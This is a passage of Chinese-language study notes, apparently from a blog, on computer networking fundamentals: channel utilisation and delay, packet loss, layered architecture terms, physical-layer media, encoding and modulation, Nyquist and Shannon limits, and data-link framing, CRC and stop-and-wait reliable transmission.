利用率</h3><p>利用率分为信道利用率和网络利用率。</p><ul><li>信道利用率：用来表示某信道有百分之几的时间是被利用的(有数据通过)</li><li>网络利用率：全网络的信道利用率的加权平均</li></ul><p>根据排队论，当某信道的利用率增大时，该信道引起的时延也会迅速增加。</p><p>如果令：</p><ul><li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.861ex" height="1.92ex" role="img" focusable="false" viewBox="0 -683 1264.6 848.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></g></svg></mjx-container>：网络空闲时延</li><li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.873ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 828 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g></g></g></svg></mjx-container>：网络当前时延</li><li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="1.735ex" height="1.595ex" role="img" focusable="false" viewBox="0 -683 767 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g></g></g></svg></mjx-container>：利用率</li></ul><p>那么则有下列关系：</p><script type="math/tex; mode=display">D=\frac{D_0}{1-U}</script><ul><li>当网络的利用率达到50%时，时延就要加倍</li><li>当网络的利用率超过50%时，时延急剧增大</li><li>当网络的利用率接近100%时，时延就趋于无穷大</li></ul><p>因此，一些拥有较大主干网的ISP通常会控制它们的信道利用率不超过50%。如果超过了，就要准备扩容，增大线路的带宽。也不能使信道利用率太低，这会使宝贵的通信资源被白白浪费。应该使用一些机制，可以根据情况动态调整输入到网络中的通信量，使网络利用率保持在合理范围内。</p><h3 id="1-6-8-丢包率"><a href="#1-6-8-丢包率" class="headerlink" title="1.6.8 丢包率"></a>1.6.8 丢包率</h3><ol><li>丢包率即分组丢失率，是指在一定的时间范围内，传输过程中丢失的分组数量与总分组数量的比率。</li><li>丢包率具体可分为接口丢包率、结点丢包率、链路丢包率、路径丢包率、网络丢包率等。</li><li>丢包率是网络运维人员非常关心的一个网络性能指标，但对于普通用户来说往往并不关心这个指标，因为他们通常意识不到网络丢包。</li><li>分组丢失主要有两种情况：<ul><li>分组在传输过程中出现误码，被结点丢弃；</li><li>分组到达一台队列已满的分组交换机时被丢弃；在通信量较大时就可能造成网络拥塞。</li></ul></li><li>因此，丢包率反映了网络的拥塞情况：<ul><li>无拥塞时路径丢包率为0</li><li>轻度拥塞时路径丢包率为1%~4%</li><li>严重拥塞时路径丢包率为5%~15%</li></ul></li></ol><h2 id="1-7-计算机网络体系结构"><a href="#1-7-计算机网络体系结构" class="headerlink" title="1.7 计算机网络体系结构"></a>1.7 计算机网络体系结构</h2><img src="/posts/e255a10a/1.7.1.png" class="" title="计算机网络体系结构"><img src="/posts/e255a10a/1.7.2.png" class="" title="计算机网络体系结构"><img src="/posts/e255a10a/1.7.4.png" class="" title="OSI模型的各层的作用"><img src="/posts/e255a10a/1.7.3.png" class="" title="五层体系结构各层的作用"><p><a href="https://www.bilibili.com/video/BV1c4411d7jb?p=9">必看！计算机网络体系结构的分层思想</a>，这个PPT做得真的绝了。</p><h3 id="1-7-1-计算机网络体系结构中的专用术语"><a href="#1-7-1-计算机网络体系结构中的专用术语" class="headerlink" title="1.7.1 计算机网络体系结构中的专用术语"></a>1.7.1 计算机网络体系结构中的专用术语</h3><h4 id="1-7-1-1-实体"><a href="#1-7-1-1-实体" class="headerlink" title="1.7.1.1 实体"></a>1.7.1.1 实体</h4><p>实体：任何可发送或接受信息的硬件或软件进程。</p><p>对等实体：收发双方相同层次中的实体。</p><img src="/posts/e255a10a/1.7.1.1.png" class="" title="实体"><h4 id="1-7-1-2-协议"><a href="#1-7-1-2-协议" class="headerlink" title="1.7.1.2 协议"></a>1.7.1.2 协议</h4><p>协议：控制两个对等实体进行逻辑通信的规则的集合。</p><p>协议的三要素：语法、语义、同步</p><ul><li>语法：定义所交换信息的格式</li><li>语义：定义收发双方所要完成的操作</li><li>同步：定义收发双方的时序关系</li></ul><h4 id="1-7-1-3-服务"><a href="#1-7-1-3-服务" class="headerlink" title="1.7.1.3 服务"></a>1.7.1.3 服务</h4><p>在协议的控制下，两个对等实体间的逻辑通信使得本层能够向上一层提供服务。</p><p>要实现本层协议，还需要使用下面一层所提供的服务。</p><p>协议是“水平的”，服务是“垂直的”。</p><p>实体看得见相邻下层所提供的服务，但并不知道实现该服务的具体协议。也就是说，下面的协议对上面的实体是“透明”的。</p><img src="/posts/e255a10a/1.7.1.2.png" class="" title="服务"><p>服务访问点：在同一系统中相邻两层的实体交换信息的逻辑接口，用于区分不同的服务类型。</p><ul><li>数据链路层的服务访问点为帧的“类型”字段。</li><li>网络层的服务访问点为IP数据报首部中的“协议字段”。</li><li>运输层的服务访问点为“端口号”。</li></ul><p>服务原语：上层使用下层所提供的服务必须通过与下层交换一些命令。</p><p>协议数据单元PDU：对等层次之间传送的数据包称为该层的协议数据单元。</p><p>服务数据单元SDU：同一系统内，层与层之间交换的数据包。</p><p>多个SDU可以合成为一个PDU；一个SDU也可划分为几个PDU。</p><img src="/posts/e255a10a/1.7.1.3.png" class="" title="服务"><h1 id="2-物理层"><a href="#2-物理层" class="headerlink" title="2. 物理层"></a>2. 物理层</h1><h2 id="2-1-基本概念"><a href="#2-1-基本概念" class="headerlink" title="2.1 基本概念"></a>2.1 基本概念</h2><p>物理层考虑的是怎样才能在连接各种计算机的传输媒体上传输数据比特流。</p><p>物理层为数据链路层屏蔽了各种传输媒体的差异，使数据链路层只需要考虑如何完成本层的协议和服务，而不必考虑网络具体的传输媒体是什么。</p><p>传输媒体不属于任何一层，如果一定要分类，则属于物理层。</p><script type="math/tex; mode=display">传输媒体\begin{cases}导引型传输媒体：同轴电缆、双绞线、光纤\\\\非导引型传输媒体：微波通信\end{cases}</script><p>物理层协议的主要任务：</p><ul><li>机械特性：指明接口所用接线器的形状和尺寸、引脚数目和排列、固定和锁定装置。</li><li>电气特性：指明在接口电缆的各条线上出现的电压的范围。</li><li>功能特性：指明某条线上出现的某一电平的电压表示何种意义。</li><li>过程特性：指明对于不同功能的各种可能事件的出现顺序。</li></ul><p>由于传输媒体种类众多(双绞线、光纤等)，物理连接方式也很多(点对点连接、广播连接等)，因此物理协议有很多种，但是每一种都需要包括以上四个特性。</p><h2 id="2-2-物理层下面的传输媒体"><a href="#2-2-物理层下面的传输媒体" class="headerlink" title="2.2 物理层下面的传输媒体"></a>2.2 物理层下面的传输媒体</h2><h3 id="2-2-1-导引型传输媒体"><a href="#2-2-1-导引型传输媒体" class="headerlink" title="2.2.1 导引型传输媒体"></a>2.2.1 导引型传输媒体</h3><p>在导引型传输媒体中，电磁波被导引沿着固体传播媒体传播。</p><p>常见的导引型传输媒体有：</p><ul><li><p>同轴电缆：生活中最常见的就是电视线。用于模拟传输。价格较贵，布线不够灵活方便。</p></li><li><p>双绞线：双绞线是最古老又常用的传输媒体。也就是生活中最常见的网线。双绞线的构成就是把两个互相绝缘的铜导线并排放在一起，按照一定规则绞合起来，因此称为双绞线。</p><p>绞合的作用：①抵御部分来自外界的电磁波干扰；②减少来自相邻导线的电磁干扰。</p></li><li><p>光纤：每一根光纤是非常细的，因此需要将它做成很结实的光缆，一根光缆少则只有一根光纤，多则可能有数十根甚至数百根光纤。 光纤的芯非常细。</p><p>优点：①通信容量大；②传输损耗小，远距离传输时更加经济；③抗雷电和电磁干扰性能好，在大电流脉冲干扰的环境下尤为重要；④无串音干扰，保密性好，不易被窃听；⑤体积小，重量轻。</p><p>缺点：①割接需要专用设备；②光电接口价格较贵。</p></li><li><p>电力线：电力线是一种比较古老的技术。应用电力线传输信号的实例最早是电力线电话。但是在目前，以电力线构建局域网已不能满足需求。</p></li></ul><h3 id="2-2-2-非导引型传输媒体"><a href="#2-2-2-非导引型传输媒体" class="headerlink" title="2.2.2 非导引型传输媒体"></a>2.2.2 非导引型传输媒体</h3><p>非导引型的传播媒体是自由空间。</p><img src="/posts/e255a10a/2.2.2.png" class="" title="电磁波频率谱"><p>电磁波频率过大对人体有害，因此一般使用介于无线电波到红外的频率来进行信息传播。</p><p>常见的非导引型传输媒体有：</p><ul><li>无线电波：无线电波用于国际广播、海事和航空通讯等。无线电波中的低频和中频端主要以地面波形式传播。高频和甚高频主要用电离层的反射传播。</li><li>微波：微波用于无线电话、无线网络、雷达、人造卫星接收等。在数据通信中占有重要地位。微波在空间中主要以直线传播，其传播距离一般只有50公里左右。传统的微波通信主要有地面微波接力通信和卫星通信。</li><li>红外线：利用红外线传输数据，例如电视遥控等。红外通信属于点对点无线传输。不能越障，传输距离短，传输速率低。</li><li>可见光：LIFI可以实现使用可见光通信，但是目前还在实验阶段，所以暂时无法取代WIFI。</li></ul><h2 id="2-3-物理层的传输方式"><a href="#2-3-物理层的传输方式" class="headerlink" title="2.3 物理层的传输方式"></a>2.3 物理层的传输方式</h2><h3 id="2-3-1-串行传输和并行传输"><a href="#2-3-1-串行传输和并行传输" class="headerlink" title="2.3.1 串行传输和并行传输"></a>2.3.1 串行传输和并行传输</h3><p>串行传输：指数据是一个比特一个比特依次发送的，只需要一条传输链路。数据在进行远距离传输的时候用的是串行传输，不是并行传输。</p><p>并行传输：指一次发送n个比特而不是一个比特，为此在发送端和接收端之间需要有n条传输线路。并行传输的优点是速度为串行传输的n倍。缺点是成本高。计算机内部数据的传输一般使用并行传输。</p><h3 id="2-3-2-同步传输和异步传输"><a href="#2-3-2-同步传输和异步传输" class="headerlink" title="2.3.2 同步传输和异步传输"></a>2.3.2 同步传输和异步传输</h3><p>同步传输：数据库以稳定的比特流形式传输，字节之间没有间隔。接收端在每个比特信号的中间时刻进行检测，以判别接收到的是比特0还是比特1。由于不同设备的时钟周期存在差异，不能做到完全相同，在传输大量数据的过程中判别时刻的累计误差会导致接收端对比特信号的判别位置错位，因此需要采取方法使收发双方的时钟保持同步。</p><p>异步传输：使用异步传输方式时，以字节为独立的传输单位，字节之间的间隔时间不固定的(因此称为异步传输)。接收端仅在每个字节的起始处对字节内的比特实现同步。为此，通常要在每个字节的前后分别加上起始位和结束位。异步指的是字节之间异步。字节之间的时间间隔不固定。但是，字节中的每个比特依旧要同步，各个比特的持续时间要相同。</p><img src="/posts/e255a10a/2.3.2.png" class="" title="同步传输和异步传输"><h3 id="2-3-3-单工、半双工、全双工通信"><a href="#2-3-3-单工、半双工、全双工通信" class="headerlink" title="2.3.3 单工、半双工、全双工通信"></a>2.3.3 单工、半双工、全双工通信</h3><p>单工通信：通信双方只有一个数据传输方向，只需要一条信道。例如无线电、广播。</p><p>半双工通信：通信双方有两个数据传输方向，但是不可以同时通信。需要两条信道。例如对讲机就是这种通信方式。</p><p>全双工通信：通信双方有两个数据传输方向，可以进行同时通信。需要两条信道。例如实时电话就是这种通信方式。</p><h2 id="2-4-编码与调制"><a href="#2-4-编码与调制" class="headerlink" title="2.4 编码与调制"></a>2.4 编码与调制</h2><img src="/posts/e255a10a/2.4.1.png" class="" title="编码与调制"><p>编码：编码就是在不改变信号性质的情况下仅对数字基带信号的波形进行变换。编码后产生的信号仍为数字信号。可以在数字信道中传输。</p><p>调制：把数据基带信号的频率范围，搬移到较高的频段，并转换为模拟信号，称为调制。调制后产生模拟信号，在模拟信道中传输。</p><p>码元：构成信号的一段波形。</p><h3 id="2-4-1-常用编码"><a href="#2-4-1-常用编码" class="headerlink" title="2.4.1 常用编码"></a>2.4.1 常用编码</h3><img src="/posts/e255a10a/2.4.2.png" class="" title="常用编码"><ul><li>不归零编码(NRZ)：在整个码元时间内，不会出现零电平。为了辨别码元个数，在发送信号时需要发送方和接收方做到严格的同步。一般需要额外一根传输线来传输时钟信号，实现同步的目的。接收方按照时钟信号的节拍来逐个接收码元。但是额外一根线资源造成浪费，在计算机网络中的数据传输一般不采用这类编码。</li><li>归零编码(RZ)：在传输过程中，每个码元传输结束后都要“归零”。因此接收方只要在信号归零后进行采样，而不需要单独的时钟信号。归零编码相当于把时钟信号用“归零”的方式放在了数据之内，看作一种自同步的信号。但是在传输过程中，大部分的数据带宽都用来传输零电平数据，造成资源浪费。编码效率低。</li><li>反向不归零编码(NRZI)：在码元时间内不会出现零电平。若后一个码元时间内所持续的电平与前一个码元时间内所持续的电平不同(也称为电平反转)则表示0，若电平保持不变则表示1。</li><li>曼彻斯特编码：在码元中间时刻会产生跳变，跳变的含义可以自己定义。例如由低电平到高电平代表1(或0)信号，由高电平到低电平代表0(或1)信号。码元中间时刻的跳变既代表时钟，又代表数据。传统以太网使用的就是曼彻斯特编码。</li><li>差分曼彻斯特编码：在差分曼彻斯特编码中间也有跳变，但是此跳变只代表时钟信号。具体的数据由码元开始处电平是否变化来表示。例如在码元结束和码元开始的时候电平做对比，有变化代表0(或1)，无变化代表1(或0)。</li></ul><h3 id="2-4-2-基本调制"><a href="#2-4-2-基本调制" class="headerlink" title="2.4.2 基本调制"></a>2.4.2 基本调制</h3><img src="/posts/e255a10a/2.4.3.png" class="" title="基本调制"><ul><li>调幅：对基带信号的波幅进行调整，例如将上图的1信号波幅进行改变，在接收方读取时有载波输出为1。</li><li>调频：对基带信号频率进行调整，例如将0信号调制为频率f1，1信号调制为频率f2。</li><li>调相：对基带信号相位进行调制，例如将0信号的初相位调整为0度，1信号的初相位调整为180度。</li></ul><p>但是在以上基本调制方法中，1个码元只能包含1个比特信息。</p><h3 id="2-4-3-混合调制"><a href="#2-4-3-混合调制" class="headerlink" title="2.4.3 混合调制"></a>2.4.3 混合调制</h3><p>如果频率和相位混合调制，因为频率和相位是相关的，即频率是相位随时间的变化率。所以一次只能调制频率和相位两个中的一个。</p><p>通常情况下，相位和振幅可以结合起来一起调制，称为正交振幅调制QAM。</p><p>比如QAM-16，在QAM-16中有12种相位，每种相位有1或2种振幅可选择。</p><img src="/posts/e255a10a/2.4.5.png" class="" title="混合调制"><p>由于此调制方法可以调制出16种码元，要完整的表示这16种情况，码元内是二进制数据，因此至少需要4个二进制数，也就是4个比特数据，因此在QAM-16调制方法中，每个码元可以表示4个比特数据。为了防止传输出错导致错误，相邻码元之间的对应关系使用格雷码(相邻二进制数只有一位不同)。</p><img src="/posts/e255a10a/2.4.4.png" class="" title="混合调制"><h2 id="2-5-信道的极限容量"><a href="#2-5-信道的极限容量" class="headerlink" title="2.5 信道的极限容量"></a>2.5 信道的极限容量</h2><img src="/posts/e255a10a/2.5.1.png" class="" title="信号失真"><p>在实际传输过程中由于通信质量的问题会导致传输信号被干扰，导致信号波形失去了码元之间的清晰界限，这种现象叫码间串扰。</p><h3 id="2-5-1-奈氏准则"><a href="#2-5-1-奈氏准则" class="headerlink" title="2.5.1 奈氏准则"></a>2.5.1 奈氏准则</h3><p>为了防止信道数据过大导致码间串扰，因此做出了信号极限容量的预测。其中最著名的就是奈氏准则。</p><p>奈氏准则：在假定的理想条件下，为了避免码间串扰，码元传输速率时有上限的。</p><img src="/posts/e255a10a/2.5.2.png" class="" title="奈氏准则"><p><strong>奈氏准则计算公式</strong></p><p>理想低通(无噪声)信道下极限数据传输速率：</p><script type="math/tex; mode=display">C=2W\log_2{V}</script><p>其中，C是数据传输速率（bit/s），W是信道带宽（Hz），V是信号状态数（可调制的不同波形的数量）。</p><h3 id="2-5-2-香农公式"><a href="#2-5-2-香农公式" class="headerlink" title="2.5.2 香农公式"></a>2.5.2 香农公式</h3><p>香农公式：带宽受限且有高斯白噪声干扰的信道的极限信息传输速率。</p><img src="/posts/e255a10a/2.5.3.png" class="" title="香农公式"><p>在信道带宽一定的情况下，根据奈氏准则和香农公式，要想提高信息的传输速率就必须采用多元制(更好的调制方法)和努力提高信道中的信噪比。</p><script type="math/tex; mode=display">数据传输速率(比特/秒)=波特率(码元传输速率，码元/秒)×每个码元携带的信息量(比特/码元)</script><h1 id="3-数据链路层"><a href="#3-数据链路层" class="headerlink" title="3. 数据链路层"></a>3. 数据链路层</h1><h2 id="3-1-数据链路层概述"><a href="#3-1-数据链路层概述" class="headerlink" title="3.1 数据链路层概述"></a>3.1 数据链路层概述</h2><p>数据链路层的功能：实现数据在一个网络之间的传输。</p><p>链路：从一个节点到一个相邻节点的一段物理线路，而中间没有任何其他交换节点。</p><p>数据链路：数据链路是把实现通信协议的硬件和软件加到链路上构成的。</p><p>数据链路以帧为单位传输和处理数据。</p><img src="/posts/e255a10a/3.1.1.png" class="" title="数据链路层的传输"><h2 id="3-2-数据链路层的三个重要问题"><a href="#3-2-数据链路层的三个重要问题" class="headerlink" title="3.2 数据链路层的三个重要问题"></a>3.2 数据链路层的三个重要问题</h2><h3 id="3-2-1-封装成帧"><a href="#3-2-1-封装成帧" class="headerlink" title="3.2.1 封装成帧"></a>3.2.1 封装成帧</h3><img src="/posts/e255a10a/3.2.1.png" class="" title="封装成帧"><p>封装成帧是把网络层交付的协议数据单元，添加帧头和帧尾的操作，称为封装成帧。主要目的是为了在链路上以帧为单元传输数据，从而实现数据链路层本身的功能。</p><p>封装后的MAC帧格式：</p><img src="/posts/e255a10a/3.2.2.png" class="" title="帧的格式"><h3 id="3-2-2-差错检测"><a href="#3-2-2-差错检测" class="headerlink" title="3.2.2 差错检测"></a>3.2.2 差错检测</h3><p>差错检测：接收方主机收到帧后，通过检错码和检错算法，就可以判断出帧在传输过程中是否出现了误码。</p><p>在传输过程中可能会产生比特差错：1 可能会变成 0， 而 0 也可能变成 1。</p><img src="/posts/e255a10a/3.2.3.png" class="" title="差错检测"><ol><li>发送方会基于发送的数据和检错算法计算出检错码，并放在帧尾。</li><li>接收方主机根据数据链路层放在帧尾的检错码和检错算法来判断传输过程是否有错误。</li><li>若接收方主机收到有误码的帧后，将该帧丢弃。</li></ol><h3 id="3-2-3-可靠传输"><a href="#3-2-3-可靠传输" class="headerlink" title="3.2.3 可靠传输"></a>3.2.3 可靠传输</h3><p>如果数据链路层向其上层提供的是不可靠服务，丢弃就丢弃了，不会有更多措施；如果数据链路层向其上层提供的是可靠服务，就还需要其它措施，确保接收方主机还可以重新收到被丢弃的这个帧的正确副本。</p><p>可靠传输是数据链路层中最基本、最重要的问题。</p><p>以上三个问题都是使用点对点信道的数据链路层来举例的。如果使用广播信道的数据链路层除了包含上面三个问题外，还有一些问题要解决：</p><ol><li><p>在发送信号过程中，如何识别是否发送的是给目的主机？</p><img src="/posts/e255a10a/3.2.4.png" class="" title="广播信道"><p>在发送数据过程中，信号是以广播的形式发送，因此数据中需要带有发送主机和目的主机地址，来实现识别主机的目的。常用的解决方法是编址：将帧的目的地址添加在帧中一起传输。</p><img src="/posts/e255a10a/3.2.5.png" class="" title="MAC编址的帧"></li><li><p>数据碰撞：在数据发送过程中可能出现有两个主机同时发送数据，就会造成数据碰撞。</p><img src="/posts/e255a10a/3.2.6.png" class="" title="数据碰撞"><p>常用的解决方法就是控制协议：CSMA/CD。</p></li></ol><p>随着技术的发展，交换技术的成熟，在有线（局域网）领域使用点对点链路和链路层交换机的交换式局域网取代了共享式局域网，在无线局域网中仍然使用的是共享信道技术。</p><h2 id="3-3-封装成帧"><a href="#3-3-封装成帧" class="headerlink" title="3.3 封装成帧"></a>3.3 封装成帧</h2><p>(看3.2.1)</p><p>在物理层中会将构成帧的各比特，转换成电信号交给传输媒体，为了便于接收方数据链路层从物理层交付比特流中提取出一个一个的帧，因此需要帧头跟帧尾来做一个帧定界，来实现从比特流中提取出一个一个的帧。</p><img src="/posts/e255a10a/3.3.1.png" class="" title="PPP帧格式"><p>例如在ppp帧的格式中，在帧头和帧尾各有一个帧定界标志，由1子节组成，其01111110和01111110所包裹的数据就是一个帧，数据链路层可以识别这个帧定界从而提取出一个帧。</p><p>但是也存在没有帧定界标志的数据链路层协议：比如MAC帧，该帧的提取由物理层添加的前导码来识别开始，并且按照稳定的时钟周期，在每一帧的结束会有96比特发送时间的间隔，以此来识别一个帧的结束。</p><p>前导码由两部分组成：前同步码，作用是使接收方的时钟同步；帧开始定界符，表明其后面紧跟着的就是MAC帧。</p><h3 id="3-3-1-透明传输"><a href="#3-3-1-透明传输" class="headerlink" title="3.3.1 透明传输"></a>3.3.1 透明传输</h3><p>透明传输：是指数据链路层对上层交付的传输数据没有任何限制，就好像数据链路层不存在一样。</p><img src="/posts/e255a10a/3.3.2.png" class="" title="透明传输"><p>在传输数据过程中可能会出现数据比特流与帧定界标志符一样的情况，造成误读定界标志导致传输错误。在这种情况下，说明数据链路层对于数据有了一个要求：不能存在与定界符一样的数据编码。这就代表着对上层交付的数据有了限制，就不是透明传输了。因此为了实现透明传输，需要在数据链路层对数据进行处理。</p><p>在数据链路层中会对数据的处理来实现透明传输功能，例如：字节填充、比特填充，主要思路是在每一个传输数据中出现的定界符进行转义，防止误读。</p><p><strong>字节填充</strong>：在面向字节的物理链路中适用。主要步骤：</p><ol><li>通过在数据中出现控制字符“SOH”或“EOT”的前面插入一个转义字符“ESC”(其十六进制编码是1B)。</li><li>接收端的数据链路层在将数据送往网络层之前删除插入的转义字符。</li><li>如果转义字符也出现在数据当中，那么应在转义字符前面插入一个转义字符 ESC。当接收端收到连续的两个转义字符时，就删除其中前面的一个。</li></ol><p><strong>比特填充</strong>：适用于面向比特传输的物理链路。主要步骤：</p><ol><li>在数据链路层中发送帧前扫描帧的数据部分，若出现连续的5个1，将在5个1后插入1个0(因为帧定界标志符为01111110)。</li><li>在接收方数据链路层接收帧时，将帧的数据部分中的每5个1后面的0剔除即可。</li></ol><p>为了提高帧的传输效率，应当使帧的数据部分的长度尽可能大些。但考虑到差错控制等多种因素，每一种数据链路层协议都规定了帧的数据部分的长度上限，即最大传送单元(MTU，Maxinum Transfer Unit)。</p><h2 id="3-4-差错检测"><a href="#3-4-差错检测" class="headerlink" title="3.4 差错检测"></a>3.4 差错检测</h2><p>(看3.2.2)</p><p>比特差错：实际的通信链路都不是理想的，比特在传输过程中可能会产生差错: 1可能会变成0，而0也可能变成1。</p><p>误码率(BER)：在一段时间内，传输错误的比特占所传输比特总数的比率称为误码率(BER，Bit Error Rate)</p><p>差错检测码(FCS)：使用差错检测码来检测数据在传输过程中是否产生了比特差错，是数据链路层所要解决的重要问题之一。</p><h3 id="3-4-1-奇偶校验"><a href="#3-4-1-奇偶校验" class="headerlink" title="3.4.1 奇偶校验"></a>3.4.1 奇偶校验</h3><img src="/posts/e255a10a/3.4.1.png" class="" title="奇偶校验"><p>由于奇偶校验的漏检率比较高，因此一般在数据链路层中不使用。</p><h3 id="3-4-2-循环冗余校验-CRC，Cyclic-Redundancy-Check"><a href="#3-4-2-循环冗余校验-CRC，Cyclic-Redundancy-Check" class="headerlink" title="3.4.2 循环冗余校验(CRC，Cyclic Redundancy Check)"></a>3.4.2 循环冗余校验(CRC，Cyclic Redundancy Check)</h3><p>循环冗余检验是一种可靠性非常高的校验方法。</p><img src="/posts/e255a10a/3.4.2.png" class="" title="CRC"><img src="/posts/e255a10a/3.4.3.png" class="" title="CRC"><img src="/posts/e255a10a/3.4.5.png" class="" title="CRC"><img src="/posts/e255a10a/3.4.4.png" class="" title="CRC"><img src="/posts/e255a10a/3.4.6.png" class="" title="CRC"><h2 id="3-5-可靠传输"><a href="#3-5-可靠传输" class="headerlink" title="3.5 可靠传输"></a>3.5 可靠传输</h2><p>(看3.2.3)</p><h3 id="3-5-1-可靠传输基本概念"><a href="#3-5-1-可靠传输基本概念" class="headerlink" title="3.5.1 可靠传输基本概念"></a>3.5.1 可靠传输基本概念</h3><p>使用差错检测技术(例如循环冗余校验CRC)，接收方的数据链路层就可检测出帧在传输过程中是否产生了误码(比特错误)。</p><p>数据链路层向上层提供的服务类型：</p><ul><li>不可靠传输服务：仅仅丢弃有误码的帧，其他什么也不做；</li><li>可靠传输服务：想办法实现发送端发送什么，接收端就收到什么。</li></ul><p>一般情况下，有线链路的误码率比较低，为了减小开销，并不要求数据链路层向上提供可靠传输服务。即使出现了误码，可靠传输的问题由其上层处理。无线链路易受干扰，误码率比较高，因此要求数据链路层必须向上层提供可靠传输服务。</p><p>比特差错只是传输差错中的一种。从整个计算机网络体系结构来看，传输差错还包括分组丢失、分组失序以及分组重复。</p><ul><li>分组丢失：路由器输入队列由于空间不足，主动丢弃收到的分组，造成分组丢失。</li><li>分组失序：由于传输过程中选择失序的问题，接收方实际收到的数据与发送方发送的分组顺序不同造成分组失序。</li><li>分组重复：分组在传输过程中由于某种原因在线路中滞留，导致一定时间内没有到达接收方，触发发送方超时重传机制，最终导致接收方收到了两个相同分组，造成分组重复。</li></ul><p>分组丢失、分组失序以及分组重复这些传输差错，一般不会出现在数据链路层，而会出现在其上层。因此可靠传输服务并不仅局限于数据链路层，其它各层均可选择实现可靠传输。</p><img src="/posts/e255a10a/3.5.1.png" class="" title="可靠传输"><p>TCP/IP体系结构中的以太网便不要求数据链路层实现可靠传输。</p><p>可靠传输的实现比较复杂，开销也比较大，是否使用可靠传输取决于应用需求。</p><h3 id="3-5-2-三种可靠传输实现机制"><a href="#3-5-2-三种可靠传输实现机制" class="headerlink" title="3.5.2 三种可靠传输实现机制"></a>3.5.2 三种可靠传输实现机制</h3><p>可靠传输服务并不局限于数据链路层，在其他各层协议均可选择实现。</p><h4 id="3-5-2-1-停止-等待协议-SW，Stop-and-Wait"><a href="#3-5-2-1-停止-等待协议-SW，Stop-and-Wait" class="headerlink" title="3.5.2.1 停止-等待协议(SW，Stop and Wait)"></a>3.5.2.1 停止-等待协议(SW，Stop and Wait)</h4><p>停止-等待协议：发送方每发送一个分组，就停止发送并等待接收方的确认分组。当收到接收方的确认分组后，才能发送下一个数据分组，如此反复进行。</p><p>停止-等待协议有4个最基本原则：</p><img src="/posts/e255a10a/3.5.2.1.png" class="" title="停止-等待协议"><ol><li><p>确认与否认。在每个数据发送后，接收方接到后会发送ACK(确认)信号确认无误收到，发送方收到ACK信号后便开始发送下一个数据。</p><p>接收方检测收到数据出现误码后，会发送NAK(否认)信号，发送方接收到NAK信号后会重新发送缓存区中的数据。</p><p>因此，在此过程中，发送方与接收方一直处于一种停止等待对方的过程，在此过程中要进行确认与否认，这也是停止-等待协议的最基本原则。</p></li><li><p>超时重传。此原则可以避免当数据传输过程中出现丢失，导致接收方一直等不到数据传送到达，而发送方又在等待接收方发送确认信号，系统处于互等的请况。</p><p>为解决该问题，可以在发送方发送完一个数据分组时，启动一个超时计时器。若到了超时计时器所设置的重传时间而发送方仍收不到接收方的任何ACK或NAK，则重传原来的数据分组，这就叫超时重传。</p><p>一般可将重传时间选为略大于“从发送方到接收方的平均往返时间”。</p></li><li><p>确认丢失。此原则可以避免接收方发送ACK信号后，由于传输问题出现ACK信号丢失，导致发送方没收到确认信号，重传分组，此时接收方重新接收到一样的分组，造成分组重复错误。</p><p>为避免分组重复这种传输错误，必须给每个分组带上序号。对于停止-等待协议，由于每发送一个数据分组就停止等待，只要保证发送一个新的数据分组，其发送序号与上次发送的数据分组序号不同即可，因此用一个比特来编号就足够了。</p></li><li><p>确认迟到。此原则可以避免接收方发送ACK信号后，由于传输问题出现ACK信号迟到，导致发送方没收到确认信号，重传分组，下一时刻ACK到达，开始传输下一